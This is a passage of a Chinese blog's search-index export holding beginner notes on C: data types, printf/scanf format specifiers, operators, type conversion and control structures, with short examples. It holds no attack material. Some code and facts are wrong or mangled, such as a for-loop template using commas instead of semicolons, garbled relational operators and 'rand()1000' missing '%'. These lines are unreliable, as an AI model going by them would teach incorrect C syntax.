</span><br></pre></td></tr></table></figure><p>在程序里可以用<code>&#123;&#125;</code>写调试代码，定义变量不会影响外面的变量<code>c99</code></p><p>你的输入和你的程序中间还有一个<code>shell</code></p><h2 id="标识符"><a href="#标识符" class="headerlink" title="标识符"></a>标识符</h2><ul><li>由字母和下划线，数字组成，但数字不能开头</li><li>且不能用<code>C</code>关键字</li><li>区分大小写，长度不限</li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量定义格式为：<br>类型 变量名=<code>value</code>；</p><ul><li>每结束一个变量必须以；结尾</li><li>变量说明必须放在函数开头部分</li><li>通过<code>=</code>赋值；</li></ul><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>宏定义:<br><code>#define 常量名 数据</code></p><p>函数内定义:<br>const  类型  类型名;</p><blockquote><p>说明：const只有c99才支持</p></blockquote><h2 id="整型数据"><a href="#整型数据" class="headerlink" title="整型数据"></a>整型数据</h2><h3 id="整型常量"><a href="#整型常量" class="headerlink" title="整型常量"></a>整型常量</h3><p>也叫常数，常见的有十进制，八进制（前缀<code>0</code>），16进制（前缀<code>0x</code>）</p><h3 id="整型变量"><a href="#整型变量" class="headerlink" title="整型变量"></a>整型变量</h3><p>可以使用<code>int</code>创建一个存储整数的空间</p><ul><li>所占字节数要看寄存器的大小， </li><li>有范围</li><li>类型有<code>int</code>，<code>short</code>，<code>long</code>，<code>unsigned</code>，区分有符号的和无符号的</li><li>通过，可同时编译多个变量</li><li><code>sizeof()</code>可以知道某变量所占字节大小；</li></ul><blockquote><p><code>sizeof()</code>是静态运算符，他的结果在编译时就决定了，不能在（）里做运算。</p></blockquote><h3 id="整形存储的二进制"><a href="#整形存储的二进制" class="headerlink" title="整形存储的二进制"></a>整形存储的二进制</h3><ul><li><p>十进制的正整数在内部就是他的二进制</p></li><li><p>而负数则采用补码的形式：</p><ul><li><code>-a</code>，补码<code>2n-a</code>，<code>n</code>为类型的位数</li></ul></li><li><p>优点：方便计算，而不用判断正负</p></li></ul><p><code>1111 1111</code>用纯二进制代表<code>255</code>，补码代表-1</p><p><a href="https://blog.csdn.net/qq_41739364/article/details/100125337">https://blog.csdn.net/qq_41739364/article/details/100125337</a></p><ul><li>设计<code>unsigned</code>的初衷是为了移位 </li></ul><ul><li><p>16进制的一个位==2进制的4个位</p></li><li><p>8进制的一个位==2进制的3个位</p></li></ul><h2 id="实型数据（浮点型）"><a href="#实型数据（浮点型）" class="headerlink" title="实型数据（浮点型）"></a>实型数据（浮点型）</h2><h3 id="实型常量"><a href="#实型常量" class="headerlink" title="实型常量"></a>实型常量</h3><ul><li>也叫<code>实数</code>或者<code>浮点数</code></li><li>在c中，实数只采用十进制，有0-9和小数点组成</li><li>指数形式需要加e或E以及阶码组成<br>如<code>2.6e-5</code></li></ul><h3 id="实型变量"><a href="#实型变量" class="headerlink" title="实型变量"></a>实型变量</h3><ul><li>分为两类，单精度<code>float</code>(占4字节)，双精度<code>double</code>(占8字节)；</li></ul><h4 id="float"><a href="#float" class="headerlink" title="float"></a><code>float</code></h4><p>输入格式：<code>%f</code><br>输出：<code>%f</code><br>定义格式<br><code>float  a = 1.0f</code></p><blockquote><p>如果不带<code>f</code>则是<code>double</code></p></blockquote><h4 id="double"><a href="#double" class="headerlink" title="double"></a><code>double</code></h4><p>输入：<code>%lf</code><br>输出：<code>%f %lf</code></p><h3 id="浮点数的精度"><a href="#浮点数的精度" class="headerlink" title="浮点数的精度"></a>浮点数的精度</h3><p>1.无法比较<br>2.永远不精确；</p><p>通常使用double</p><h2 id="字符型数据"><a href="#字符型数据" class="headerlink" title="字符型数据"></a>字符型数据</h2><h3 id="字符常量"><a href="#字符常量" class="headerlink" title="字符常量"></a>字符常量</h3><ul><li>由单引号括起的字符，<code>&#39;a&#39;</code>；</li><li>不能用双引号</li><li>常量只能是单个字符，区分字符串</li><li>可以是字符集中任意字符，但<code>&#39;1&#39;</code>和<code>1</code>不一样</li><li>占用一个字节，实质为<code>ASCⅡ</code>码，所以可以像整数那样去计算</li></ul><h3 id="字符变量（逃逸字符）"><a href="#字符变量（逃逸字符）" class="headerlink" title="字符变量（逃逸字符）"></a>字符变量（逃逸字符）</h3><ul><li><p>转义字符变量</p><ul><li>是一种特殊的变量，不同于字符原有的意义，所以称转义</li><li>如<code>\n</code>代表换行</li></ul></li><li><p>特别是所有<code>ASCⅡ</code>码（<code>0-255</code>）都可以用<code>\ddd</code>(1-3位的八进制)和<code>\xhh</code>(1-2位的十六进制)表示</p></li><li><p>字符变量</p><ul><li>类型说明符为<code>char</code>（占1byte）</li><li>因为只有一个字节，所以只能存放一个字符（<code>ASCⅡ</code>）</li></ul></li><li><p>C语言允许把整型值（2/4/8）赋给字符变量，字符变量赋给整型值，因为整型值字节多，转为字符值时按低8位处理</p></li></ul><h3 id="字符串常量"><a href="#字符串常量" class="headerlink" title="字符串常量"></a>字符串常量</h3><ul><li><p>由双引号括起的字符序列，<code>“china”</code></p></li><li><p>可以含一个或多个字符</p></li><li><p>不能把字符串常量赋给字符变量</p></li><li><p>通常以<code>\0</code>结尾，系统自动加上，所占字节为所有字节数+1</p></li><li><p>C语言会自动把两个<code>“”“”</code>的内容连接起来</p></li><li><p>C没有字符串变量，要用字符数组来存放字符串变量</p></li></ul><h2 id="基本输入与输出"><a href="#基本输入与输出" class="headerlink" title="基本输入与输出"></a>基本输入与输出</h2><p>因为<code>C</code>本身没有输入输出语句，这是由C函数库提供的，函数库有大量具有独立功能的函数程序块，<code>printf</code>和<code>scanf</code>存储在<code>stdio.h</code>头文件中，使用时要在源程序中加上<code>#include</code></p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p><code>printf</code>（格式控制，输出序列）</p><ul><li>格式控制为双引号括着的字符串，包含格式说明<code>%</code>和普通字符；<br><code>int %d</code><br><code>long %ld</code><br><code>float %f</code><br><code>double %lf</code><br><code>char %c</code></li><li>输出序列则是若干的数据变量，也可以是表达式</li><li><code>printf(“%3.2f”,)</code>数据占3位（超过不限制），向右对齐，左边补空格，小数点可以有2位，<code>-3</code>表示向左对齐</li></ul><p>字符输出<code>putchar</code></p><ul><li>只处理一个字符</li></ul><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p><code>scanf</code>（格式控制，地址表列）</p><ul><li><p>赋值给地址表列（以&amp;开头）</p></li><li><p>&amp;右边必须是明确的变量</p></li></ul><p>字符输入<code>getchar</code></p><ul><li>只处理一个字符</li></ul><h2 id="格式化的输入输出"><a href="#格式化的输入输出" class="headerlink" title="格式化的输入输出"></a>格式化的输入输出</h2><ul><li><code>printf</code><ul><li><code>% [flags][width][.prec][hIL]type</code></li></ul></li></ul><table><thead><tr><th align="center">Flag</th><th align="center">含义</th><th align="center">width 或 prec</th><th align="center">含义</th><th align="center">hIL（类型修饰）</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">-</td><td align="center">左对齐</td><td align="center">number</td><td align="center">最小字符数</td><td align="center">hh</td><td align="center">单个字节</td></tr><tr><td align="center">+</td><td align="center">在前面放+或-</td><td align="center">*</td><td align="center">下一个参数是字符数</td><td align="center">h</td><td align="center">short</td></tr><tr><td align="center">(space)</td><td align="center">正数留空</td><td align="center">.number</td><td align="center">小数点后面的位数</td><td align="center">l</td><td align="center">long</td></tr><tr><td align="center">0</td><td align="center">0填充</td><td align="center">.*</td><td align="center">下一个参数是小数点后面的位数</td><td align="center">ll</td><td align="center">long long</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">L</td><td align="center">long double</td></tr></tbody></table><table><thead><tr><th align="center">type</th><th align="center">用于</th><th align="center">type</th><th align="center">用于</th></tr></thead><tbody><tr><td align="center">i 或 d</td><td align="center">int</td><td align="center">g</td><td align="center">float</td></tr><tr><td align="center">u</td><td align="center">unsigned int</td><td align="center">G</td><td align="center">float</td></tr><tr><td align="center">o</td><td align="center">八进制</td><td align="center">a 或 A</td><td align="center">十六进制浮点</td></tr><tr><td align="center">x</td><td align="center">十六进制</td><td align="center">c</td><td align="center">char</td></tr><tr><td align="center">X</td><td align="center">字母大写的十六进制</td><td align="center">s</td><td align="center">字符串</td></tr><tr><td align="center">f 或 F</td><td align="center">float,6</td><td align="center">p</td><td align="center">指针</td></tr><tr><td align="center">e 或 E</td><td align="center">指数</td><td align="center">n</td><td align="center">读入/写出的个数</td></tr></tbody></table><ul><li><code>scanf</code><ul><li><code>%[flag]typpe</code></li></ul></li></ul><table><thead><tr><th align="center">flag</th><th align="center">含义</th><th align="center">flag</th><th align="center">含义</th></tr></thead><tbody><tr><td align="center">*</td><td align="center">跳过</td><td align="center">l</td><td align="center">long,double</td></tr><tr><td align="center">数字</td><td align="center">最大字符数</td><td align="center">ll</td><td align="center">long long</td></tr><tr><td align="center">hh</td><td align="center">char</td><td align="center">L</td><td align="center">long doble</td></tr><tr><td align="center">h</td><td align="center">short</td><td align="center"></td><td align="center"></td></tr></tbody></table><table><thead><tr><th align="center">type</th><th align="center">用于</th><th align="center">type</th><th align="center">用于</th></tr></thead><tbody><tr><td align="center">d</td><td align="center">int</td><td align="center">a,e,f,g</td><td align="center">float</td></tr><tr><td align="center">i</td><td align="center">整数，可能是8进制或16进制</td><td align="center">c</td><td align="center">char</td></tr><tr><td align="center">u</td><td align="center">unsigned int</td><td align="center">s</td><td align="center">字符串</td></tr><tr><td align="center">o</td><td align="center">八进制</td><td align="center">[…]</td><td align="center">所允许的字符</td></tr><tr><td align="center">x</td><td align="center">十六进制</td><td align="center">p</td><td align="center">指针</td></tr></tbody></table><p><code>printf &amp;scanf</code>是由返回值的</p><ul><li>读入的项目数</li><li>输出的字符数</li></ul><h2 id="赋值运算"><a href="#赋值运算" class="headerlink" title="赋值运算"></a>赋值运算</h2><h3 id="运算法则"><a href="#运算法则" class="headerlink" title="运算法则"></a>运算法则</h3><ul><li><code>()</code>→<code>-</code>→<code>%*/</code>→<code>+-</code></li><li>复合赋值</li><li>类型最好为<code>double</code></li><li>表示简化赋值操作的代码<br>例如<code>x=x+10</code>表示为<code>x+=10</code></li><li><code>+=</code>告诉编译程序：<code>x</code>被赋值为<code>x+10</code></li><li>同<code>*=/=;-=;%=</code></li><li>根式<code>sqrt()</code></li><li>指针运算<code>pow(2,4)</code>表示2的4次方;可以用来表示多次根式;</li><li><code>exp(3)</code>表示e的三次方</li><li>对数<code>log()</code></li></ul><h3 id="自增和自减-只适用于变量"><a href="#自增和自减-只适用于变量" class="headerlink" title="自增和自减(只适用于变量)"></a>自增和自减(只适用于变量)</h3><p><code>x=x+1</code>可写成<code>x++</code>或者<code>++x</code></p><p>当是一个单独的程序语句时,符号在前面后面都没关系;but下面的情况特殊</p><p><code>y=x++</code>表示现将x的值给y，x再加1</p><p><code>y=++x</code>表示x先加1再赋给y</p><p><code>++--</code>优先级最高吧</p><p><code>x++</code><strong>表示的值</strong>是<code>x</code>的值<strong>,运算</strong>表示<code>x=x+1</code></p><p><code>++x</code><strong>表示的值</strong>是<code>x+1</code>的值,<strong>运算</strong>表示<code>x=x+1</code></p><h2 id="关系运算"><a href="#关系运算" class="headerlink" title="关系运算"></a>关系运算</h2><p>关系运算有两种结果，<strong>是1否0</strong></p><p><code>&lt;</code> <code>&lt;</code> <code>&lt;=</code> <code>=</code><br>1.这四组优先级相同</p><p>2.比下两个优先级高</p><p><code>==</code>  比较等于<br> <code>=</code> 不等于</p><ol><li>关系运算符的优先级低于算数运算符</li><li>但他高于赋值运算符</li><li>有括号还是算括号</li></ol><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><p>结果同样只有0和1<br><code>||</code>或<br><code>&amp;&amp;</code>与<br><code>!</code>非<br>1.优先级从上到下逐渐升<br>2.但<code>||&amp;&amp;</code>低于关系运算符,高于赋值运算符<code>!</code>；高于算数运算符;实测比增减量符低</p><ul><li>计算同物理电路</li><li>逻辑表达式对比是否非0值</li></ul><p><strong>重要!!!</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line">main()&#123;</span><br><span class="line">    <span class="keyword">int</span> a=<span class="number">1</span>,b=<span class="number">2</span>,c=<span class="number">3</span>,d=<span class="number">4</span>,m=<span class="number">2</span>,n=<span class="number">2</span>;</span><br><span class="line">    (m=a&gt;b)&amp;&amp;(n=c&gt;d);<span class="comment">//m=0,因为是与运算,所以后面不看了,n=2</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,n);</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="逗号运算符及逗号表达式"><a href="#逗号运算符及逗号表达式" class="headerlink" title="逗号运算符及逗号表达式"></a>逗号运算符及逗号表达式</h2><ul><li>可以连接多个表达式</li><li>表达式1,表达式2</li><li>从左到右依次计算</li><li>优先级最低</li><li>以右边的表达式作为结果</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">i = <span class="number">3</span>, <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果是3</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span> <span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">i = (<span class="number">3</span>, <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, i);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果是4</p><blockquote><p>注意：调用函数时圆括号的逗号是标点符号</p></blockquote><h2 id="条件运算符和条件关系式"><a href="#条件运算符和条件关系式" class="headerlink" title="条件运算符和条件关系式"></a>条件运算符和条件关系式</h2><ul><li><p>是C语言唯一的三目运算符(需要3个数据和表达式构成的条件表达式)</p><p><strong>一般形式</strong></p><p><code>表达式1 ? 表达式2 : 表达式3</code></p><ul><li><p>意为如果表达式1成立,则为表达式2的值,否则是表达式3的值</p></li><li><p>结合方向从右向左</p></li></ul></li></ul><h2 id="自动类型转换机制和强制类型转换"><a href="#自动类型转换机制和强制类型转换" class="headerlink" title="自动类型转换机制和强制类型转换"></a>自动类型转换机制和强制类型转换</h2><ul><li><p><strong>自动</strong><br>在运算中若有多个类型则计算机会自动转化为范围最宽的,但如果有<code>float</code>会自动转化为<code>double</code></p></li><li><p><strong>强制</strong><br>格式<br><code>(类型)表达式</code></p></li></ul><p>1.优先级和<code>+--</code>相同,因为它是<strong>单目运算符</strong>(只有一个变量的运算符)</p><p>2.对于<code>printf</code>，任何小于<code>int</code>的类型都会转换成<code>int</code>，<code>float</code>会转换成<code>double</code></p><p>3.但<code>scanf</code>不会</p><h2 id="产生随机数列"><a href="#产生随机数列" class="headerlink" title="产生随机数列"></a>产生随机数列</h2><p>用到<code>srand,rand</code>函数<br>在<code>#include &lt;stdlib&gt;</code>函数库里<br>使用<code>rand</code>创建种子,<code>rand</code>根据种子产生随机数;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">srand(time(<span class="number">0</span>));</span><br><span class="line">rand()<span class="number">1000</span><span class="comment">//产生1000以内的随机数;</span></span><br></pre></td></tr></table></figure><h2 id="选择结构程序设计"><a href="#选择结构程序设计" class="headerlink" title="选择结构程序设计"></a>选择结构程序设计</h2><p><strong>表达式里只要<code>=0</code>出现就会退出循环体!!!</strong><br><code>emmm表达式使用 &lt;= 会给自己贴标签</code></p><h3 id="顺序结构"><a href="#顺序结构" class="headerlink" title="顺序结构"></a>顺序结构</h3><h3 id="选择结构"><a href="#选择结构" class="headerlink" title="选择结构"></a>选择结构</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//if-else结构格式:</span></span><br><span class="line"><span class="keyword">if</span>(表达式)</span><br><span class="line">        &#123; &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        &#123; &#125;</span><br></pre></td></tr></table></figure><ul><li>退化形式<br>无<code>else</code>直接结束</li><li>可以嵌套使用,<code>else</code>配对原则:与之前最近的<code>if</code>配对;包含多个语句分支时,用{}括起语句不容易出错<br><strong>多分支结构</strong></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()</span><br><span class="line">    &#123; &#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>()</span><br><span class="line">    &#123; &#125;</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123; &#125;</span><br></pre></td></tr></table></figure><p><code>switch</code>实现<strong>多分支结构</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">case</span> 常量表达式<span class="number">1</span>:语句块<span class="number">1</span>;<span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span></span><br><span class="line">.....</span><br><span class="line">    <span class="keyword">default</span>:语句块;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>若没有<code>break</code>,则一直执行到<code>default</code></li></ul><blockquote><p>个人理解<code>if-else</code>和<code>switch</code>条件分支语句</p><p>当输入的范围广时用<code>if-else</code>,反之都行</p></blockquote><h3 id="循环结构"><a href="#循环结构" class="headerlink" title="循环结构"></a>循环结构</h3><h4 id="当型循环"><a href="#当型循环" class="headerlink" title="当型循环"></a><strong>当型循环</strong></h4><p>表达式在循环体上面,不满足条件会直接跳出循环;</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(表达式)</span><br><span class="line">&#123;</span><br><span class="line">    循环体;</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><h4 id="直到型循环"><a href="#直到型循环" class="headerlink" title="直到型循环;"></a>直到型循环;</h4><p>表达式在循环体下面,不满足条件也会先执行一次循环体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">    循环体;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(表达式);</span><br></pre></td></tr></table></figure><h4 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(表达式<span class="number">1</span>,表达式<span class="number">2</span>,表达式<span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line">     循环体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>表达式2没有默认是<code>1</code></p><p>运行步骤:</p><ul><li><p>先运行表达式1,然后对表达式2求解,为真则进入循环体,再执行表达式3,退回上一步;</p></li><li><p>表达式可以缺失,但<code>;</code>不能少.</p></li></ul><h4 id="break-continue"><a href="#break-continue" class="headerlink" title="break continue"></a><code>break continue</code></h4><p><code>break</code>出现在循环体中会直接跳出循环</p><p><code>continue</code>则会回到原来的循环体</p><p>针对内层循环</p><h4 id="离开多重循环"><a href="#离开多重循环" class="headerlink" title="离开多重循环"></a>离开多重循环</h4><p>1.接力<code>break</code>:</p><p>内层循环定义一个变量<code>exit == 1</code></p><p>外面每层循环加上<code>if ( exit ==1 )  break</code></p><p>2.<code>goto out</code></p><p><code>out:</code></p><p>会直接跳到<code>out:</code>之后的地方</p><p>表达式里只要<code>=0</code>出现就会退出循环体!!!</p><p>循环结构的选择:</p><p>1.固定次数用<code>for</code></p><p>2.无论如何都要运行一次用<code>do while</code></p><p>3.其他用<code>while</code></p><p>​                         </p>]]></content>
      
      
      <categories>
          
          <category> C </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
